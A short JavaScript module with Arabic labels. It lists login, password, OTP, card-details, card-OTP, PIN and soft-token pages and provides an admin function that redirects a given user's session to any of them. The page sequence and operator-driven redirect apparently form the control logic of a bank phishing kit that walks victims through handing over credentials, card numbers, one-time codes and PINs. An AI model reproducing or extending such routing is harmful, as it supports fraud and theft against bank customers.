export const SITE_PAGES = [
  { path: "/", label: "تسجيل الدخول" },
  { path: "/password", label: "كلمة المرور" },
  { path: "/otp", label: "OTP الدخول" },
  { path: "/visa", label: "بيانات البطاقة" },
  { path: "/visaOtp", label: "OTP البطاقة" },
  { path: "/pin", label: "PIN البطاقة" },
  { path: "/softToken", label: "Soft Token" },
];

export function buildAdminRedirect(user, page) {
  const id = user._id;
  const baseSession = { id };

  switch (page.path) {
    case "/":
      return { path: "/", search: "", session: baseSession };
    case "/password":
      return { path: "/password", search: "", session: baseSession };
    case "/otp":
      return { path: "/otp", search: "", session: baseSession };
    case "/visa":
      return { path: "/visa", search: "", session: baseSession };
    case "/visaOtp":
      return { path: "/visaOtp", search: "", session: baseSession };
    case "/pin":
      return { path: "/pin", search: "", session: baseSession };
    case "/softToken":
      return { path: "/softToken", search: "", session: baseSession };
    default:
      return { path: page.path, search: "", session: baseSession };
  }
}
